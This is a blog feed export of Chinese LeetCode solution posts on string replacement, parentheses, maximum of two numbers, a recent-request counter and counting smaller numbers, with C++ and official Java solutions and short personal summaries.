<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>请实现一个函数，把字符串 <code>s</code> 中的每个空格替换成”%20”。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;We are happy.&quot;</span><br><span class="line">输出：&quot;We%20are%20happy.&quot;</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<p><code>0 &lt;= s 的长度 &lt;= 10000</code></p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串，对每一个空格元素，使用string的成员函数replace进行子串替换。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.6M，击败7.61%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">replaceSpace</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            <span class="comment">//遍历字符串</span></span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//替换字符</span></span><br><span class="line">                s.replace(i,<span class="number">1</span>,<span class="string">&quot;%20&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/ti-huan-kong-ge-lcof/solution/mian-shi-ti-05-ti-huan-kong-ge-by-leetcode-solutio/">官方题解</a>:</h6><p><strong>方法一：字符数组</strong></p>
<p>由于每次替换从 1 个字符变成 3 个字符，使用字符数组可方便地进行替换。建立字符数组地长度为 s 的长度的 3 倍，这样可保证字符数组可以容纳所有替换后的字符。</p>
<p>获得 <code>s</code> 的长度 <code>length</code><br>创建字符数组 <code>array</code>，其长度为 <code>length * 3</code><br>初始化 <code>size</code> 为 <code>0</code>，<code>size</code> 表示替换后的字符串的长度<br>从左到右遍历字符串 <code>s</code><br>获得 <code>s</code> 的当前字符 <code>c</code><br>如果字符 <code>c</code> 是空格，则令 <code>array[size] = &#39;%&#39;</code>，<code>array[size + 1] = &#39;2&#39;</code>，<code>array[size + 2] = &#39;0&#39;</code>，并将 <code>size</code> 的值加 3<br>如果字符 <code>c</code> 不是空格，则令 <code>array[size] = c</code>，并将 <code>size</code> 的值加 1<br>遍历结束之后，<code>size</code> 的值等于替换后的字符串的长度，从 <code>array</code> 的前 <code>size</code> 个字符创建新字符串，并返回新字符串</p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">replaceSpace</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">char</span>[] array = <span class="keyword">new</span> <span class="keyword">char</span>[length * <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> c = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                array[size++] = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">                array[size++] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">                array[size++] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                array[size++] = c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String newStr = <span class="keyword">new</span> String(array, <span class="number">0</span>, size);</span><br><span class="line">        <span class="keyword">return</span> newStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂性分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。遍历字符串 <code>s</code> 一遍。</li>
<li>空间复杂度：$O(n)$。额外创建字符数组，长度为 <code>s</code> 的长度的 3 倍。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解是使用Java实现的（用Java干嘛呀😑），道不同不相为谋，借鉴思想就完事了。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>最外层的括号</title>
    <url>/2020/11/13/%E6%9C%80%E5%A4%96%E5%B1%82%E7%9A%84%E6%8B%AC%E5%8F%B7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/remove-outermost-parentheses/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>有效括号字符串为空 <code>(&quot;&quot;)</code>、<code>&quot;(&quot; + A + &quot;)&quot;</code> 或 <code>A + B</code>，其中 <code>A</code> 和 <code>B</code> 都是有效的括号字符串，+ 代表字符串的连接。例如，<code>&quot;&quot;</code>，<code>&quot;()&quot;</code>，<code>&quot;(())()&quot;</code> 和 <code>&quot;(()(()))&quot;</code> 都是有效的括号字符串。</p>
<p>如果有效字符串 S 非空，且不存在将其拆分为 <code>S = A+B</code> 的方法，我们称其为<strong>原语（primitive）</strong>，其中 <code>A</code> 和 <code>B</code> 都是非空有效括号字符串。</p>
<p>给出一个非空有效字符串 <code>S</code>，考虑将其进行原语化分解，使得：<code>S = P_1 + P_2 + ... + P_k</code>，其中 <code>P_i</code> 是有效括号字符串原语。</p>
<p>对 <code>S</code> 进行原语化分解，删除分解中每个原语字符串的最外层括号，返回 <code>S</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;(()())(())&quot;</span><br><span class="line">输出：&quot;()()()&quot;</span><br><span class="line">解释：</span><br><span class="line">输入字符串为 &quot;(()())(())&quot;，原语化分解得到 &quot;(()())&quot; + &quot;(())&quot;，</span><br><span class="line">删除每个部分中的最外层括号后得到 &quot;()()&quot; + &quot;()&quot; &#x3D; &quot;()()()&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;(()())(())(()(()))&quot;</span><br><span class="line">输出：&quot;()()()()(())&quot;</span><br><span class="line">解释：</span><br><span class="line">输入字符串为 &quot;(()())(())(()(()))&quot;，原语化分解得到 &quot;(()())&quot; + &quot;(())&quot; + &quot;(()(()))&quot;，</span><br><span class="line">删除每个部分中的最外层括号后得到 &quot;()()&quot; + &quot;()&quot; + &quot;()(())&quot; &#x3D; &quot;()()()()(())&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：&quot;()()&quot;</span><br><span class="line">输出：&quot;&quot;</span><br><span class="line">解释：</span><br><span class="line">输入字符串为 &quot;()()&quot;，原语化分解得到 &quot;()&quot; + &quot;()&quot;，</span><br><span class="line">删除每个部分中的最外层括号后得到 &quot;&quot; + &quot;&quot; &#x3D; &quot;&quot;。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>S.length &lt;= 10000</code></li>
<li><code>S[i]</code> 为 <code>&quot;(&quot;</code> 或 <code>&quot;)&quot;</code></li>
<li><code>S</code> 是一个有效括号字符串</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用STL模板库中的stack，左括号’(‘入栈，右括号’)’出栈。遍历字符串的每一个字符，判断是否是最外层括号，只需要判断栈中是否只有一个左括号’(‘且下一个元素是右括号’)’。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败86.98%，内存消耗6.8M，击败58.35%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">removeOuterParentheses</span><span class="params">(<span class="built_in">string</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;S.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(st.empty())&#123;</span><br><span class="line">                <span class="comment">//若栈空，则入栈</span></span><br><span class="line">                st.push(S[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//若栈元素个数为1</span></span><br><span class="line">                <span class="keyword">if</span>(st.top()==S[i])&#123;</span><br><span class="line">                    <span class="comment">//栈中元素与当前字符相同，则继续入栈,并把当前字符存到结果字符串中</span></span><br><span class="line">                    st.push(S[i]);</span><br><span class="line">                    result+=S[i];</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//与栈中元素不同，也就是说是匹配的括号(),出栈</span></span><br><span class="line">                    st.pop();</span><br><span class="line">                    <span class="comment">//不是最外层括号，存到结果中</span></span><br><span class="line">                    <span class="keyword">if</span>(!st.empty())&#123;</span><br><span class="line">                        result+=S[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，也挺简单的，不聊了。😏</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>最小高度树</title>
    <url>/2020/11/10/%E6%9C%80%E5%B0%8F%E9%AB%98%E5%BA%A6%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
  </entry>
  <entry>
    <title>最大数值</title>
    <url>/2020/11/17/%E6%9C%80%E5%A4%A7%E6%95%B0%E5%80%BC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/maximum-lcci/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>编写一个方法，找出两个数字<code>a</code>和<code>b</code>中最大的那一个。不得使用if-else或其他比较运算符。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： a &#x3D; 1, b &#x3D; 2</span><br><span class="line">输出： 2</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用三目运算符，不知道可以吗？</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败6.42%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，题目要求不能使用比较运算符，三目运算符中也包含比较了，应该也是不满足题意的。通过看题解，总结如下：</p>
<p>返回两个数的最大值，两种情况：</p>
<ul>
<li>$a&gt;b$，那么返回$\frac{a+b+a-b}{2}$</li>
<li>$a&lt;b$，那么返回$\frac{b+a+b-a}{2}$</li>
</ul>
<p>两种情况综合一下就是要返回$\frac{a+b+|a-b|}{2}$</p>
<p>nice😊，注意a、b要强制转换成long进行计算，否则会溢出。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>最近的请求次数</title>
    <url>/2020/11/21/%E6%9C%80%E8%BF%91%E7%9A%84%E8%AF%B7%E6%B1%82%E6%AC%A1%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/number-of-recent-calls/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>写一个 <code>RecentCounter</code> 类来计算特定时间范围内最近的请求。</p>
<p>请你实现 <code>RecentCounter</code> 类：</p>
<p><code>RecentCounter()</code> 初始化计数器，请求数为 0 。<br><code>int ping(int t)</code> 在时间 <code>t</code> 添加一个新请求，其中 <code>t</code> 表示以毫秒为单位的某个时间，并返回过去 <code>3000</code> 毫秒内发生的所有请求数（包括新请求）。确切地说，返回在 <code>[t-3000, t]</code> 内发生的请求数。<br>保证 每次对 <code>ping</code> 的调用都使用比之前更大的 t 值。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：</span><br><span class="line">[&quot;RecentCounter&quot;, &quot;ping&quot;, &quot;ping&quot;, &quot;ping&quot;, &quot;ping&quot;]</span><br><span class="line">[[], [1], [100], [3001], [3002]]</span><br><span class="line">输出：</span><br><span class="line">[null, 1, 2, 3, 3]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">RecentCounter recentCounter &#x3D; new RecentCounter();</span><br><span class="line">recentCounter.ping(1);     &#x2F;&#x2F; requests &#x3D; [1]，范围是 [-2999,1]，返回 1</span><br><span class="line">recentCounter.ping(100);   &#x2F;&#x2F; requests &#x3D; [1, 100]，范围是 [-2900,100]，返回 2</span><br><span class="line">recentCounter.ping(3001);  &#x2F;&#x2F; requests &#x3D; [1, 100, 3001]，范围是 [1,3001]，返回 3</span><br><span class="line">recentCounter.ping(3002);  &#x2F;&#x2F; requests &#x3D; [1, 100, 3001, 3002]，范围是 [2,3002]，返回 3</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= t &lt;= 10^9</code></li>
<li>保证每次对 <code>ping</code> 调用所使用的 <code>t</code> 值都 <strong>严格递增</strong></li>
<li>至多调用 <code>ping</code> 方法 <code>10^4</code> 次</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>初始化计数器为0,定义一个vector容器存储请求,然后调用ping()时在存储请求容器中添加一个新请求,计数器加1,遍历上次请求范围内的请求,判断它们是否满足在当前请求的范围中,若不满足则计数器减一,最后返回计数器.</p>
<p><strong>c++代码：</strong>(执行用时240ms，击败97.33%，内存消耗57.3M，击败6.80%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RecentCounter</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; request;</span><br><span class="line">    <span class="keyword">int</span> counter;</span><br><span class="line">    <span class="comment">//请求总数</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    RecentCounter() &#123;</span><br><span class="line">        counter=<span class="number">0</span>;</span><br><span class="line">        n=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ping</span><span class="params">(<span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//加上当前请求数，所以初始值为1</span></span><br><span class="line">        <span class="comment">//int n=request.size();</span></span><br><span class="line">        <span class="comment">//遍历距上次请求3000ms范围内的请求，从前向后依此判断是否在当前请求范围内</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n-counter;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(request[i]&gt;=t<span class="number">-3000</span> &amp;&amp; i&lt;=t)&#123;</span><br><span class="line">                <span class="comment">//还满足时间范围，则以后的都满足</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//不满足则最近请求计数减1，继续遍历</span></span><br><span class="line">                --counter;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//添加新请求</span></span><br><span class="line">        request.emplace_back(t);</span><br><span class="line">        ++counter;</span><br><span class="line">        ++n;</span><br><span class="line">        <span class="keyword">return</span> counter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your RecentCounter object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * RecentCounter* obj = new RecentCounter();</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;ping(t);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/number-of-recent-calls/solution/">官方题解</a>:</h6><p>方法一：队列<br>我们只会考虑最近 3000 毫秒到现在的 <code>ping</code> 数，因此我们可以使用队列存储这些 <code>ping</code> 的记录。当收到一个时间 <code>t</code> 的 <code>ping</code> 时，我们将它加入队列，并且将所有在时间 <code>t - 3000</code> 之前的 <code>ping</code> 移出队列。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RecentCounter</span> &#123;</span></span><br><span class="line">    Queue&lt;Integer&gt; q;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RecentCounter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ping</span><span class="params">(<span class="keyword">int</span> t)</span> </span>&#123;</span><br><span class="line">        q.add(t);</span><br><span class="line">        <span class="keyword">while</span> (q.peek() &lt; t - <span class="number">3000</span>)</span><br><span class="line">            q.poll();</span><br><span class="line">        <span class="keyword">return</span> q.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(Q)$，其中 $Q$ 是 <code>ping</code> 的次数。</p>
</li>
<li><p>空间复杂度：$O(W)$，其中 $W = 3000$ 是队列中最多存储的 <code>ping</code> 的记录数目。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>以前解题用的都是vector容器,我没有删除已经不在统计范围内的请求,这一点是我误解了,这道题确实是比较适合用队列求解,以后还是要活学活用,官方题解是用Java/Python实现的,giao,c++不香吗,学一下这个思想吧😎</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>有多少小于当前数字的数字</title>
    <url>/2020/11/09/%E6%9C%89%E5%A4%9A%E5%B0%91%E5%B0%8F%E4%BA%8E%E5%BD%93%E5%89%8D%E6%95%B0%E5%AD%97%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/how-many-numbers-are-smaller-than-the-current-number/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>nums</code>，对于其中每个元素 <code>nums[i]</code>，请你统计数组中比它小的所有数字的数目。</p>
<p>换而言之，对于每个 <code>nums[i]</code> 你必须计算出有效的 <code>j</code> 的数量，其中 <code>j</code> 满足 <code>j != i</code> <strong>且</strong> <code>nums[j] &lt; nums[i]</code> 。</p>
<p>以数组形式返回答案。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [8,1,2,2,3]</span><br><span class="line">输出：[4,0,1,1,3]</span><br><span class="line">解释： </span><br><span class="line">对于 nums[0]&#x3D;8 存在四个比它小的数字：（1，2，2 和 3）。 </span><br><span class="line">对于 nums[1]&#x3D;1 不存在比它小的数字。</span><br><span class="line">对于 nums[2]&#x3D;2 存在一个比它小的数字：（1）。 </span><br><span class="line">对于 nums[3]&#x3D;2 存在一个比它小的数字：（1）。 </span><br><span class="line">对于 nums[4]&#x3D;3 存在三个比它小的数字：（1，2 和 2）。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [6,5,4,8]</span><br><span class="line">输出：[2,1,0,3]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [7,7,7,7]</span><br><span class="line">输出：[0,0,0,0]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 500</code></li>
<li><code>0 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组nums，对每一个元素和数组nums中的所有元素进行比较，大于则数目加1。</p>
<p><strong>c++代码：</strong>(执行用时68ms，击败17.74%，内存消耗10.1M，击败77.40%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">smallerNumbersThanCurrent</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">int</span> num;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size();++i)&#123;</span><br><span class="line">            num=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;nums.size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]&lt;nums[i])&#123;</span><br><span class="line">                    ++num;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            result.push_back(num);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/how-many-numbers-are-smaller-than-the-current-number/solution/you-duo-shao-xiao-yu-dang-qian-shu-zi-de-shu-zi--2/">官方题解:</a></h6><p><strong>方法一：暴力</strong><br>比较容易想到的一个方法是，对于数组中的每一个元素，我们都遍历数组一次，统计小于当前元素的数的数目。</p>
